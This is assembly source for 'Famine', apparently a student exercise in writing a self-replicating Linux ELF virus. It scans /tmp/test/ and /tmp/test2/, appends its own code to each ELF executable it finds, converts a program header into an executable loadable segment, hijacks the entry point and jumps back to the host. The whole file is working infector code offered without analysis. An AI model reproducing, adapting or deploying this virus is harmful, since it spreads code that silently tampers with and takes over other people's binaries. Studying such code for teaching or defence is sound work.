%include "includes/header.s"

global      _start                              ;must be declared for linker (ld)


_host:
	mov rax, _exit
	syscall


_start:   ;Entry-Point
	push rdi
	push rsi
	push rcx
	push rdx
	push rbp
	mov rbp, rsp
	sub rbp, famine_size
	
	
	lea rax, [rel _start]
	mov rdx, [rel famine_entry]
	sub rax, rdx
	add rax, [rel host_entry]
	push rax
	lea rdi, [rel infect_dir]
	
.opendir:
	mov r14, rdi
	mov rsi, O_RDONLY | O_DIRECTORY
	mov rax, _open
	syscall
	test eax, eax
	jl .nextdir
	mov STACK(famine.dir_fd), rax

.readdir:
	mov rdx, DIRENT_ARR_SIZE
	lea rsi, STACK(famine.dirents)
	mov rdi, STACK(famine.dir_fd)
	mov rax, _getdents
	syscall
	test  rax,rax
	jle .closedir
	xor r13, r13
	mov r12, rax

.file:
	lea rdi, STACK(famine.dirents)
	add rdi, r13
	movzx edx, word[rdi + dirent.d_reclen]
	mov al, byte[rdi + rdx - 1]
	add rdi, dirent.d_name
	add r13, rdx
	cmp al, DT_REG
	jne .nextfile
	call process

.nextfile:
	cmp r13, r12
	jl .file
	jmp .readdir

.closedir:
	mov rdi, STACK(famine.dir_fd)
	mov rax, _close
	syscall

.nextdir:
	xor ecx, ecx
	mul ecx
	dec ecx
	mov rdi, r14
	repnz scasb
	cmp byte[rdi], 0
	jnz .opendir
	pop rax
	pop rbp
	pop rdx
	pop rcx
	pop rsi
	pop rdi
	jmp _exx

process:
	mov rsi, r14
	mov rax, rdi
	lea rdi, STACK(famine.file_path)
	mov rdx, rdi

.dirname:
	movsb
	cmp byte [rsi], 0
	jnz .dirname
	mov rsi, rax

.filename:
	movsb
	cmp byte[rsi - 1], 0
	jnz .filename
	mov rdi, rdx
				;open file
	mov rsi, O_RDWR
	mov rax, _open
	syscall


	test eax, eax
	jl .return
	mov STACK(famine.file_fd), rax

				;stat
	lea rsi, STACK(famine.stat)
	mov rdi, rax
	mov rax, _fstat
	syscall
	cmp rax, 0
	jnz .close
	mov rsi, qword STACK(famine.stat + stat.st_size)
	mov STACK(famine.file_size), rsi
	cmp rsi, elf64_ehdr_size + elf64_phdr_size + FAMINE_SIZE
	jl .close
				;MMAP file
	xor r9, r9
	mov r8, STACK(famine.file_fd)
	mov r10, MAP_SHARED
	mov rdx, PROT_READ | PROT_WRITE
	xor rdi, rdi
	mov rax, _mmap
	syscall
	cmp rax, MMAP_ERRORS
	jae .close
	mov STACK(famine.file_data), rax
	mov rdi, rax
	call check_elf64
	test al,al
	jz .unmap
	call inject_self

.unmap:
	mov rsi, STACK(famine.file_size)
	mov rdi, STACK(famine.file_data)
	mov rax, _munmap
	syscall

.close:
	mov rdi, STACK(famine.file_fd)
	mov rax, _close
	syscall

.return:
	ret

check_elf64:
	xor rax, rax
	cmp qword[rdi+8], rax
	jnz .return
	mov rdx, _SYSV_			;elf SYSV
	cmp qword [rdi], rdx
	jz .continue
	mov rdx, _GNU_			;ELF_GNU
	cmp qword[rdi], rdx
	jnz .return

.continue:
	mov rdx, _DYN_
	cmp qword[rdi + 16], rdx
	jz .ok
	mov rdx, _EXEC_
	cmp qword[rdi + 16], rdx
	jnz .return
.ok:
	inc rax
.return:
	ret

inject_self:
	push r13
	push r14
	push r15
	mov r15, rdi
	mov rdx, qword [rdi + elf64_ehdr.e_entry]
	movzx rcx, word [rdi + elf64_ehdr.e_phnum]
	mov rax, qword[rdi + elf64_ehdr.e_phoff]
	add rdi,rax
	mov r14, rdi

	.segment:
	cmp rcx, 0
	jl .return
	mov ax, SEGMENT_TYPE
	mov r11w, word [rdi]
	cmp ax, r11w
	jnz .next
	jmp .infect

	.next:
	add rdi, elf64_phdr_size
	dec rcx
	jmp .segment

	.infect:
	push rdi
	mov rdx, r14
; get target End of file
	mov rdi, STACK(famine.file_fd) ; target fd to rdi
	mov rsi, 0 ; offset 0
	mov rdx, END_SEEK
	mov rax, _lseek
	syscall
	push rax; save eof from lseek to stack

	; get delta  ( address at execution time)
	call .delta
	.delta:
	pop r13
	sub r13, .delta
	
	;write v
	mov rdi, STACK(famine.file_fd) ; fd to rdi
	lea rsi, [r13 + _start] ; load _start to rsi
	mov rdx, _end - _start  ; virus size to rdx
	mov r10, rax ; rax hold eof from lseek syscall 
	mov rax, _write
	syscall
	
	cmp rax, 0
	jbe .return
	
	.edit_phdr:
	pop rax				;RDI = the offset of patched PHEADER
	pop rdi
	push rdi
	push rax
	mov dword [rdi], 1
	mov eax, PF_R
	or eax, PF_X
	mov dword [rdi + 4], eax
	pop rax				; RAX = The offset of our injected V , (old EOF)
	mov [rdi + 8], rax  ; set phdr.offset  = rax
	mov r13, qword STACK(famine.stat + stat.st_size) ; load target size to r13
	add r13, 0xc000000 ; add vsize to r13
	mov [rdi + 16], r13 ; edit  p_vaddr
	mov [rdi + 24], r14 ; change paddr to new size
	mov qword [rdi + 48], 0x200000  ; set align to 2mb
	add qword [rdi + 32], _end - _start + 5
	add qword [rdi + 40], _end - _start + 5

	;	write it
	mov rdi, STACK(famine.file_fd)
	lea rsi, [rdi]
	mov dx, 56
	mov r10, r14
	mov rax, _write
	syscall

	.edit_ehdr:
	mov rdi, STACK(famine.file_data)
	mov r14, [rdi + elf64_ehdr.e_entry ] ; save original e_entry to r14
	mov [rdi + elf64_ehdr.e_entry], r13
	
	;write it
	mov rdi, STACK(famine.file_fd)
	mov rsi, r15
	mov rdx, 64
	mov r10, 0
	mov rax, _write
	syscall

	.jmp_wuw:
	mov rdi , STACK(famine.file_fd)
	mov rsi, 0
	mov rdx, END_SEEK
	mov rax, _lseek
	syscall						; seek to file_end
	
;	compute jump value
	pop rdi ;   restore patched pheader 
	mov rdx, [rdi + elf64_phdr.p_vaddr]
	sub rdx, 9
	sub r14, rdx
	sub r14, _end - _start
	mov byte STACK(famine.jmp), JMP; jmp opcode
	mov dword STACK(famine.jmp + 1), r14d

;write it
	mov rdi, STACK(famine.file_fd)
	lea rsi, STACK(famine.jmp)
	mov rdx, 5
	sub rax, 14
	mov r10, rax ; EOF From last call to lseek
	mov rax, _write
	syscall

	mov rax, _sync
	syscall
	.return :
		pop r15
		pop r14
		pop r13
		ret

infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
signature		db			'Famine version 99.0 (c)oded by <araout>', 0xa
famine_entry	dq			_start
host_entry		dq			_host

_exx:
jmp .exit
	.exit:
		mov rax, _exit
		mov rdi, 0
		syscall

_end:
